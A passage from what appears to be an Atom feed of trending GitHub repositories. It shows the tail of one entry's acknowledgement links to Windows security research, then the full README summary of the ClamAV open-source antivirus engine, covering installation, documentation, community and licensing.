href=&#34;https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html&#34;&gt;Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/itm4n&#34;&gt;itm4n&lt;/a&gt; for the original PPL userland exploit implementation, &lt;a href=&#34;https://github.com/itm4n/PPLdump&#34;&gt;PPLDump&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mobile.twitter.com/asaf_gilboa&#34;&gt;Asaf Gilboa&lt;/a&gt; for &lt;a href=&#34;https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2&#34;&gt;Lsass Memory Dumps are Stealthier than Ever Before - Part 2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Cisco-Talos/clamav</title>
    <updated>2022-06-26T01:36:42Z</updated>
    <id>tag:github.com,2022-06-26:/Cisco-Talos/clamav</id>
    <link href="https://github.com/Cisco-Talos/clamav" rel="alternate"></link>
    <summary type="html">&lt;p&gt;ClamAV - Documentation is here: https://docs.clamav.net&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ClamAV&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img width=&#34;250&#34; height=&#34;250&#34; src=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/logo.png&#34; alt=&#34;Maeve, the ClamAV mascot&#34;&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; ClamAVÂ® is an open source antivirus engine for detecting trojans, viruses, malware &amp;amp; other malicious threats. &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/Cisco-Talos/clamav/actions&#34;&gt;&lt;img src=&#34;https://github.com/Cisco-Talos/clamav/workflows/CMake%20Build/badge.svg?sanitize=true&#34; height=&#34;18&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/6vNAqWnVgw&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/636023333074370595.svg?logo=discord&#34; height=&#34;18&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/clamav&#34;&gt;&lt;img src=&#34;https://abs.twimg.com/favicons/twitter.ico&#34; width=&#34;18&#34; height=&#34;18&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;Documentation &amp;amp; FAQ&lt;/h2&gt; &#xA;&lt;p&gt;ClamAV documentation is hosted at &lt;a href=&#34;https://docs.clamav.net/&#34;&gt;docs.clamav.net&lt;/a&gt;. The source archive for each release also includes a copy of the documentation for &lt;a href=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/docs/html/UserManual.html&#34;&gt;offline&lt;/a&gt; reading.&lt;/p&gt; &#xA;&lt;p&gt;You can contribute to the documentation by submitting improvements to &lt;a href=&#34;https://github.com/Cisco-Talos/clamav-documentation&#34;&gt;Cisco-Talos/clamav-documentation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;ClamAV News&lt;/h2&gt; &#xA;&lt;p&gt;For information about the features in this and prior releases, read &lt;a href=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/NEWS.md&#34;&gt;the news&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Catch up on the latest about ClamAV by reading our &lt;a href=&#34;http://blog.clamav.net&#34;&gt;blog&lt;/a&gt; and follow us on Twitter &lt;code&gt;@clamav&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;ClamAV Signatures&lt;/h2&gt; &#xA;&lt;p&gt;Anyone can learn to read and write ClamAV signatures. To get started, see our &lt;a href=&#34;https://docs.clamav.net/manual/Signatures.html&#34;&gt;signature writing manual&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation Instructions&lt;/h2&gt; &#xA;&lt;h3&gt;Using Docker&lt;/h3&gt; &#xA;&lt;p&gt;ClamAV can be run using Docker. For details, visit to the online manual under &lt;a href=&#34;https://docs.clamav.net/manual/Installing/Docker.html&#34;&gt;&#34;Docker&#34;&lt;/a&gt; and check out our images on &lt;a href=&#34;https://hub.docker.com/r/clamav/clamav&#34;&gt;Docker Hub&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Using a Package Manager&lt;/h3&gt; &#xA;&lt;p&gt;For help installing from a package manager, refer to the online manual under &lt;a href=&#34;https://docs.clamav.net/manual/Installing/Packages.html&#34;&gt;&#34;Packages&#34;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Using an Installer&lt;/h3&gt; &#xA;&lt;p&gt;The following install packages are available for download from &lt;a href=&#34;https://www.clamav.net/downloads&#34;&gt;clamav.net/downloads&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Linux - Debian and RPM packages for x86_64 and i686. &lt;em&gt;New in v0.104.&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;macOS - PKG installer for x86_64 and arm64 (universal). &lt;em&gt;New in v0.104.&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Windows - MSI installers and portable ZIP packages for win32 and x64.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To learn how to use these packages, refer to the online manual under &lt;a href=&#34;https://docs.clamav.net/manual/Installing.html#installing-with-an-installer&#34;&gt;&#34;Installing&#34;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Build from Source&lt;/h3&gt; &#xA;&lt;p&gt;For step-by-step instructions, refer to the online manual:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.clamav.net/manual/Installing/Installing-from-source-Unix.html&#34;&gt;Unix/Linux/Mac&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.clamav.net/manual/Installing/Installing-from-source-Windows.html&#34;&gt;Windows&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The source archive for each release includes a copy of the documentation for &lt;a href=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/docs/html/UserManual.html&#34;&gt;offline&lt;/a&gt; reading.&lt;/p&gt; &#xA;&lt;p&gt;A reference with all of the available build options can be found in the &lt;a href=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/INSTALL.md&#34;&gt;INSTALL.md&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;You can find additional advice for developers in the online manual under &lt;a href=&#34;https://docs.clamav.net/manual/Development.html&#34;&gt;&#34;For Developers&#34;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Upgrading from a previous version&lt;/h3&gt; &#xA;&lt;p&gt;Visit &lt;a href=&#34;https://docs.clamav.net/faq/faq-upgrade.html&#34;&gt;the FAQ&lt;/a&gt; for tips on how to upgrade from a previous version.&lt;/p&gt; &#xA;&lt;h2&gt;Join the ClamAV Community&lt;/h2&gt; &#xA;&lt;p&gt;The best way to get in touch with the ClamAV community is to join our &lt;a href=&#34;https://docs.clamav.net/faq/faq-ml.html&#34;&gt;mailing lists&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can also join the community on our &lt;a href=&#34;https://discord.gg/6vNAqWnVgw&#34;&gt;ClamAV Discord chat server&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Want to make a contribution?&lt;/h2&gt; &#xA;&lt;p&gt;The ClamAV development team welcomes &lt;a href=&#34;https://github.com/Cisco-Talos/clamav&#34;&gt;code contributions&lt;/a&gt;, improvements to &lt;a href=&#34;https://github.com/Cisco-Talos/clamav-documentation&#34;&gt;our documentation&lt;/a&gt;, and also &lt;a href=&#34;https://github.com/Cisco-Talos/clamav/issues&#34;&gt;bug reports&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Thanks for joining us!&lt;/p&gt; &#xA;&lt;h2&gt;Licensing&lt;/h2&gt; &#xA;&lt;p&gt;ClamAV is licensed for public/open source use under the GNU General Public License, Version 2 (GPLv2).&lt;/p&gt; &#xA;&lt;p&gt;See &lt;code&gt;COPYING.txt&lt;/code&gt; for a copy of the license.&lt;/p&gt; &#xA;&lt;h3&gt;3rd Party Code&lt;/h3&gt; &#xA;&lt;p&gt;ClamAV contains a number of components that include code copied in part or in whole from 3rd party projects and whose code is not owned by Cisco and which are licensed differently than ClamAV. These include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;tomsfastmath: public domain&lt;/li&gt; &#xA; &lt;li&gt;Yara: Apache 2.0 license &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Yara has since switched to the BSD 3-Clause License; Our source is out-of-date and needs to be updated.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;7z / lzma: public domain&lt;/li&gt; &#xA; &lt;li&gt;libclamav&#39;s NSIS/NulSoft parser includes: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;zlib: permissive free software license&lt;/li&gt; &#xA;   &lt;li&gt;bzip2 / libbzip2: BSD-like license&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;OpenBSD&#39;s libc/regex: BSD license&lt;/li&gt; &#xA; &lt;li&gt;file: BSD license&lt;/li&gt; &#xA; &lt;li&gt;str.c: Contains BSD licensed modified-implementations of strtol(), stroul() functions, Copyright (c) 1990 The Regents of the University of California.&lt;/li&gt; &#xA; &lt;li&gt;pngcheck (png.c): MIT/X11-style license&lt;/li&gt; &#xA; &lt;li&gt;getopt.c: MIT license&lt;/li&gt; &#xA; &lt;li&gt;Curl: license inspired by MIT/X, but not identical&lt;/li&gt; &#xA; &lt;li&gt;libmspack: LGPL license&lt;/li&gt; &#xA; &lt;li&gt;UnRAR (libclamunrar): a non-free/restricted open source license &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Note: The UnRAR license is incompatible with GPLv2 because it contains a clause that prohibits reverse engineering a RAR compression algorithm from the UnRAR decompression code. For this reason, libclamunrar/libclamunrar_iface is not linked at all with libclamav. It is instead loaded at run-time. If it fails to load, ClamAV will continue running without RAR support.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See the &lt;code&gt;COPYING&lt;/code&gt; directory for a copy of the 3rd party project licenses.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;Credit for contributions to each release can be found in the &lt;a href=&#34;https://raw.githubusercontent.com/Cisco-Talos/clamav/main/NEWS.md&#34;&gt;News&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;ClamAV is brought to you by &lt;a href=&#34;https://www.clamav.net/about.html#credits&#34;&gt;the ClamAV Team&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>